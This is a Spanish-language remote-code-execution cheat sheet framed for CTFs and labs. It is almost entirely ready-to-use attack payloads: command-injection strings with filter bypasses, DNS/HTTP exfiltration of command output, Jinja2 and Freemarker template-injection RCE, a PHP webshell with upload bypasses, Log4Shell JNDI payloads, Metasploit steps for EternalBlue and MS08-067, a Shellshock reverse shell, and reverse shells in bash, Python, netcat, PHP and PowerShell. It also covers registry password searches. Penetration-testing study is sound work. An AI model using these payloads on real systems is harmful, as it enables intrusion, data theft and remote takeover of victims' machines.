# RCE — Guía de Referencia
### Remote Code Execution · Vectores de explotación · CTF & lab

> ⚠️ Uso exclusivo en entornos controlados (CTF, laboratorios, sistemas propios o con autorización explícita).

**Leyendas:**
- 🌐 `web` — vector web/HTTP
- 🔌 `red` — vector de red/servicio
- 👁️ `blind` — ejecución sin output directo
- 🐚 `shell` — obtención de reverse shell
- 🪟 `windows` — específico Windows

---

## WEB

### 01 · OS Command Injection

Ocurre cuando la aplicación pasa input del usuario directamente a una función de sistema (`system()`, `exec()`, `shell_exec()`…) sin sanitizar.

**¿Por qué?** — El más clásico de OWASP. Si la app hace algo como `ping <user_input>` sin sanitizar, cualquiera de estos operadores ejecuta comandos arbitrarios.

#### Operadores de encadenamiento — Linux 🌐

```bash
# ; ejecuta ambos comandos secuencialmente
127.0.0.1; whoami

# && ejecuta el segundo solo si el primero tiene éxito
127.0.0.1&& id

# | pipe — output del primero al segundo
127.0.0.1| id

# || ejecuta el segundo solo si el primero falla
127.0.0.1|| id

# Sustitución de comandos
127.0.0.1`id`
127.0.0.1$(id)
```

#### Operadores de encadenamiento — Windows 🪟

```cmd
127.0.0.1& whoami
127.0.0.1| whoami
127.0.0.1&& whoami
```

---

### 02 · Blind Command Injection 🌐 👁️

La app ejecuta el comando pero no devuelve output. Se confirma la ejecución por efectos secundarios: tiempo de respuesta, peticiones DNS/HTTP, o escritura de ficheros.

**¿Por qué?** — Muy común en producción — los devs suprimen errores y output. Si no hay respuesta visible pero hay inyección, esto lo confirma antes de intentar una reverse shell.

#### Detección por tiempo (sleep)

```bash
# Linux — si la respuesta tarda 5s, hay ejecución
127.0.0.1; sleep 5
127.0.0.1$(sleep 5)

# Windows
127.0.0.1& timeout /t 5
127.0.0.1& ping -n 5 127.0.0.1
```

#### Detección out-of-band (DNS/HTTP) — mejor con Burp Collaborator

```bash
# Linux — genera petición DNS a tu servidor
127.0.0.1; nslookup tuservidor.oastify.com
127.0.0.1; curl http://tuservidor.oastify.com/$(whoami)

# Exfiltrar output via DNS
127.0.0.1; nslookup $(whoami).tuservidor.oastify.com
```

---

### 03 · Bypass de filtros comunes 🌐

Técnicas para evadir WAFs o sanitización parcial que bloquea caracteres o palabras clave.

**¿Por qué?** — Muchas apps solo filtran los casos obvios. Conocer alternativas equivalentes es clave cuando los payloads directos no funcionan.

```bash
# Espacios bloqueados → usar ${IFS} o tabulador
cat${IFS}/etc/passwd
cat%09/etc/passwd        # %09 = tab URL-encoded

# Palabras bloqueadas → comillas vacías o variables
w'h'oami
who$()ami
c"at" /etc/passwd

# Slash bloqueado → variable de entorno
echo ${PATH:0:1}         # → /
cat ${PATH:0:1}etc${PATH:0:1}passwd

# Concatenación en bash
/bin/ca''t /etc/passwd
```

---

### 04 · Server-Side Template Injection (SSTI) 🌐

Ocurre cuando el input del usuario se renderiza directamente en un motor de templates (Jinja2, Twig, Freemarker…) sin sanitizar, permitiendo ejecutar código del lado servidor.

**¿Por qué?** — Muy frecuente en CTFs. Si la app refleja tu input en una página (campos de nombre, parámetros URL), prueba primero expresiones matemáticas para detectar el motor.

#### Fingerprinting — ¿qué motor es?

```
{{7*7}}          → Jinja2 / Twig / Pebble devuelven 49
${7*7}           → Freemarker / Mako
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby interpolation

# Diferencia Jinja2 vs Twig
{{7*'7'}}        → Jinja2: 7777777 | Twig: 49
```

#### RCE — Jinja2 (Python/Flask) 🌐 🐚

**¿Por qué?** — Flask/Jinja2 es el stack más común en CTFs de nivel medio. Una vez identificado Jinja2, estos payloads dan acceso directo al sistema operativo a través del intérprete Python.

```python
# Acceso a subclases de object para llegar a subprocess
{{''.__class__.__mro__[1].__subclasses__()}}

# Ejecutar comando (busca el índice de Popen en la lista anterior)
{{''.__class__.__mro__[1].__subclasses__()[ÍNDICE]('id',shell=True,stdout=-1).communicate()}}

# Alternativa más limpia vía config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Si __class__ está filtrado — usar request/cycler/joiner
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

#### RCE — Freemarker (Java) 🌐

**¿Por qué?** — Común en aplicaciones Java empresariales. Freemarker permite acceso directo a clases Java desde el template.

```
${"freemarker.template.utility.Execute"?new()("id")}
```

---

### 05 · File Upload → RCE 🌐 🐚

Si la app permite subir ficheros y sirve el directorio de uploads, subir un fichero ejecutable (PHP, JSP, ASPX) que actúe como shell.

**¿Por qué?** — Uno de los RCE más directos. La validación del lado cliente (extensión, tipo MIME) es trivialmente bypasseable — lo importante es si el servidor ejecuta el fichero.

#### Webshell PHP mínima

```php
<?php system($_GET['cmd']); ?>
# Uso: http://target/uploads/shell.php?cmd=id

# Alternativas si system() está deshabilitado
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

#### Bypass de filtros de extensión

```
# Extensiones alternativas que Apache/Nginx pueden ejecutar
shell.php5   shell.php4   shell.php3
shell.phtml  shell.pHp    shell.PhP

# Bypass de validación MIME — cambiar Content-Type en Burp
Content-Type: image/jpeg    ← aunque el archivo sea .php

# Double extension
shell.jpg.php
shell.php.jpg   ← si el servidor ejecuta por primera extensión

# Null byte (PHP < 5.3)
shell.php%00.jpg
```

---

### 06 · Insecure Deserialization 🌐 🐚

Cuando la app deserializa objetos controlados por el usuario sin validación, se pueden inyectar objetos maliciosos que ejecutan código al ser procesados.

**¿Por qué?** — En CTFs aparece en cookies serializadas en base64, parámetros POST, o headers. La herramienta clave es `ysoserial` para Java y `phpggc` para PHP.

#### PHP — phpggc

```bash
# Generar payload para Laravel gadget chain
phpggc Laravel/RCE1 system 'id' -b

# Listar gadget chains disponibles
phpggc -l
```

#### Java — ysoserial

```bash
# Generar payload para Commons Collections
java -jar ysoserial.jar CommonsCollections6 'id' | base64

# Probar con curl (cookie serializada)
curl -b "session=$(java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0)" http://target/
```

---

## RED / SERVICIOS

### 07 · EternalBlue — MS17-010 (SMB) 🔌 🪟 🐚

Buffer overflow en SMBv1 (puerto 445) que permite RCE sin autenticación en Windows 7/2008 sin parchear.

**¿Por qué?** — Si nmap detecta Windows + puerto 445 abierto + SMBv1 habilitado, EternalBlue es el primer vector a probar. Usado en WannaCry y NotPetya en el mundo real.

```bash
# Detección previa con nmap
nmap --script=smb-vuln-ms17-010 -p 445 <target>
```

```
# Explotación — Metasploit
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <tu_ip>
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

---

### 08 · Log4Shell — CVE-2021-44228 🔌 🌐 👁️ 🐚

Log4j2 evalúa expresiones JNDI en strings que loguea. Inyectando `${jndi:ldap://...}` en cualquier campo que se loguee, se fuerza al servidor a hacer una petición LDAP y cargar una clase Java remota.

**¿Por qué?** — Afecta a millones de aplicaciones Java. En CTFs aparece en cualquier campo de input. La detección es out-of-band — necesitas un servidor LDAP malicioso o Burp Collaborator.

#### Payload de detección (OOB)

```
# Inyectar en cualquier header o parámetro
User-Agent: ${jndi:ldap://tuservidor.oastify.com/a}
X-Forwarded-For: ${jndi:ldap://tuservidor.oastify.com/a}
username=${jndi:ldap://tuservidor.oastify.com/a}

# Bypass de filtros que bloquean "jndi"
${${lower:j}ndi:ldap://...}
${${::-j}${::-n}${::-d}${::-i}:ldap://...}
${j${::-n}di:ldap://...}
```

#### Explotación — JNDI-Exploit-Kit

```bash
# Levantar servidor JNDI malicioso
java -jar JNDIExploit.jar -i <tu_ip> -p 8888

# Payload apuntando al servidor
${jndi:ldap://<tu_ip>:1389/Basic/Command/Base64/<cmd_b64>}
```

---

### 09 · Shellshock — CVE-2014-6271 🔌 🌐 🐚

Bash ejecuta código arbitrario al parsear variables de entorno que contienen funciones malformadas. Explotable en servidores CGI donde los headers HTTP se convierten en variables de entorno de bash.

**¿Por qué?** — Clásico de CTFs con servidores Apache+CGI antiguos. El header User-Agent se convierte en variable de entorno y bash lo ejecuta.

```bash
# Detección — si devuelve "vulnerable" en la respuesta
curl -H 'User-Agent: () { :; }; echo "vulnerable"' http://<target>/cgi-bin/test.cgi

# RCE — ejecutar comando
curl -H 'User-Agent: () { :; }; /bin/bash -c "id"' http://<target>/cgi-bin/test.cgi

# Reverse shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<tu_ip>/4444 0>&1' \
     http://<target>/cgi-bin/test.cgi
```

---

### 10 · MS08-067 — Netapi (SMB/RPC) 🔌 🪟 🐚

RCE sin autenticación en Windows XP/2003 vía SMB (puerto 445) o RPC (puerto 135). El exploit del gusano Conficker.

**¿Por qué?** — En CTFs con máquinas Windows XP/2003 (HackTheBox Legacy) es el vector principal. Detectado por nmap con `smb-vuln-ms08-067`.

```
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <target>
set LHOST <tu_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

---

## POST-EXPLOTACIÓN

### 11 · Estabilización de shell 🐚

Una raw shell sin TTY no permite contraseñas interactivas, sudo, ni Ctrl+C.

**¿Por qué?** — Paso obligatorio tras conseguir una reverse shell. Sin TTY muchos comandos fallan o son peligrosos (Ctrl+C mata el proceso).

#### Método Python (Linux)

```bash
# En la shell recibida
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z para backgroundear
stty raw -echo; fg
# En la shell estabilizada
export TERM=xterm
export SHELL=bash
```

#### Método socat (más limpio)

```bash
# En tu máquina (listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# En el target (necesita socat instalado o transferirlo)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<tu_ip>:4444
```

---

### 12 · Reconocimiento post-explotación

#### Enumeración básica Linux

```bash
id && whoami               # quién soy
uname -a                   # kernel y OS
cat /etc/passwd            # usuarios del sistema
sudo -l                    # qué puedo ejecutar como sudo
find / -perm -4000 2>/dev/null  # binarios SUID
cat /etc/crontab           # tareas programadas
env                        # variables de entorno (posibles credenciales)
ss -tlnp                   # puertos internos activos
ps aux                     # procesos corriendo
```

#### Enumeración básica Windows 🪟

```cmd
whoami /all                # usuario + privilegios + grupos
systeminfo                 # OS, parches instalados
net user                   # usuarios locales
net localgroup administrators  # admins locales
tasklist /svc              # procesos y servicios
netstat -ano               # conexiones y puertos
reg query HKLM /f password /t REG_SZ /s  # buscar passwords en registro
```

---

### 13 · Transferencia de ficheros

**¿Por qué?** — Necesario para subir linpeas, winpeas, socat, chisel u otras herramientas cuando el target no tiene acceso a internet.

#### Linux

```bash
# Servidor HTTP en tu máquina
python3 -m http.server 8080

# Descargar en el target
wget http://<tu_ip>:8080/linpeas.sh -O /tmp/linpeas.sh
curl http://<tu_ip>:8080/linpeas.sh -o /tmp/linpeas.sh
```

#### Windows 🪟

```cmd
certutil -urlcache -f http://<tu_ip>:8080/winpeas.exe C:\Windows\Temp\wp.exe
powershell -c "IWR http://<tu_ip>:8080/winpeas.exe -OutFile C:\Temp\wp.exe"
```

---

## REVERSE SHELLS

### 14 · Listeners

> Siempre levanta el listener **ANTES** de ejecutar el payload en el target.

```bash
# netcat
nc -lvnp 4444

# rlwrap — con historial de comandos (recomendado para Windows shells)
rlwrap nc -lvnp 4444
```

---

### 15 · Reverse shells — Linux

#### Bash

```bash
bash -i >& /dev/tcp/<tu_ip>/4444 0>&1

# Alternativa si el anterior falla
bash -c 'bash -i >& /dev/tcp/<tu_ip>/4444 0>&1'

# URL-encoded para inyección en parámetros GET
bash+-c+'bash+-i+>%26+/dev/tcp/<tu_ip>/4444+0>%261'
```

#### Python3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<tu_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

#### Netcat / mkfifo

```bash
# nc con -e (si está disponible)
nc <tu_ip> 4444 -e /bin/bash

# mkfifo (nc sin -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <tu_ip> 4444 >/tmp/f
```

#### PHP

```bash
php -r '$sock=fsockopen("<tu_ip>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

---

### 16 · Reverse shells — Windows 🪟

#### PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<tu_ip>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Msfvenom — generar ejecutable

**¿Por qué?** — Cuando puedes subir y ejecutar un binario en Windows. Genera un `.exe` que al ejecutarse conecta de vuelta al listener de Metasploit.

```bash
# Generar
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=<tu_ip> LPORT=4444 \
         -f exe -o shell.exe
```

```
# Listener en msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <tu_ip>
set LPORT 4444
run
```

---

## Flujo completo — de RCE a shell estable

```bash
# 1 — levantar listener (siempre primero)
rlwrap nc -lvnp 4444

# 2 — ejecutar payload en el target (ejemplo bash)
bash -c 'bash -i >& /dev/tcp/<tu_ip>/4444 0>&1'

# 3 — estabilizar la shell recibida
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# 4 — reconocimiento inmediato
id && sudo -l && find / -perm -4000 2>/dev/null
```

> Sin estabilizar la shell: no hay Ctrl+C, no hay sudo interactivo, no hay autocompletado.

---

*RCE Reference — uso exclusivo en entornos autorizados · CTF / laboratorio*
